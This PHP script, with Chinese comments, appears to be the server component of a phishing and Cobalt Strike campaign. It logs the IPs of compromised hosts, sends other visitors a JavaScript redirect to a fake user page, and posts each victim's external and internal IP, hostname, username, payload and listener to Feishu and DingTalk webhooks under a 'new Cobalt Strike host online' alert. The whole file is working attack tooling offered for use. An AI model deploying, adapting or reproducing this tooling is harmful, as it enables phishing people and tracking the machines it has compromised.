<?php

$fish_tiaozhuan = "window.location.href=\"http://xxxxxx/fish/fake_user/index.html\";";//此处填写钓鱼页面地址

function request_by_curl($remote_server, $post_string) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $remote_server);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array ('Content-Type: application/json;charset=utf-8'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    // 线下环境不用开启curl证书验证, 未调通情况可尝试添加该代码
    curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}
$db = "botIPs.txt";
$dbGIP = "botGIPs.txt";
$ip = $_SERVER["REMOTE_ADDR"];
$botIP = @$_GET['internalIP'];
$botGIP = @$_GET['externalIP'];
if (!is_null($botIP)) {
    $existingIPs = file($db, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!in_array(base64_encode($botIP), $existingIPs)) {
        $bots = fopen($db, "a") or die("Unable to open bots file!");
        fwrite($bots, base64_encode($botIP) . "\n");
    }
}
if (!is_null($botGIP)) {
    $existingGIPs = file($dbGIP, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!in_array(base64_encode($botGIP), $existingGIPs)) {
        $botgs = fopen($dbGIP, "a") or die("Unable to open bots file!");
        fwrite($botgs, base64_encode($botGIP) . "\n");
        fclose($botgs);
    }
    
}
 else {
    $botIPs = [];
    if (file_exists($db)) {
        $line = file_get_contents($db);
        $botIPs = explode("\n", $line);
    }
    $botGIPs = [];
    if (file_exists($dbGIP)) {
        $lineGIP = file_get_contents($dbGIP);
        $botGIPs = explode("\n", $lineGIP);
    }
    if (in_array(base64_encode($ip), $botIPs) || in_array(base64_encode($ip), $botGIPs)) {
        header('Content-type: text/javascript');
        echo "";
    } else {
        header('Content-type: text/javascript');
        echo $fish_tiaozhuan;
    }
}

$Attacktime = date('Y-m-d H:i:s');

if(@$_GET['source'] == 'fish'){
    $webhook = "https://open.feishu.cn/open-apis/bot/v2/hook/xxxxxxxxxxxx";//填写飞书webhook地址
    $message="出口IP：".$_GET['externalIP']."\r\n内网IP：".$_GET['internalIP']."\r\n主机名：".$_GET['computerName']."\r\n用户名：".$_GET['userName']."\r\n载荷名：".$_GET['Process']."\r\n监听器：".$_GET['Listener']."\r\n时间戳：".$Attacktime."\r\n";
    $data = array ("msg_type" =>"post","content" => ["post" => ["zh_cn" => ["title" =>"CobaltStrike有主机上线啦~","content" =>[[["tag" =>"text","text" =>$message]],[["tag" =>"at","user_id" =>"all"]]]]]]);
    $data_string = json_encode($data);
    $result = request_by_curl($webhook, $data_string);
}
if(@$_GET['source'] == 'fish'){
    $webhook = "https://oapi.dingtalk.com/robot/send?access_token=xxxxxxxxx";//填写钉钉webhook地址
    $message="CobaltStrike有主机上线啦~"."\r\n出口IP：".$_GET['externalIP']."\r\n内网IP：".$_GET['internalIP']."\r\n主机名：".$_GET['computerName']."\r\n用户名：".$_GET['userName']."\r\n载荷名：".$_GET['Process']."\r\n监听器：".$_GET['Listener']."\r\n时间戳：".$Attacktime."\r\n";
    $data = array ('msgtype' => 'text','text' => array ('content' => $message),'at' => array ('isAtAll' => true));
    $data_string = json_encode($data);
    $result = request_by_curl($webhook, $data_string);
}

?>
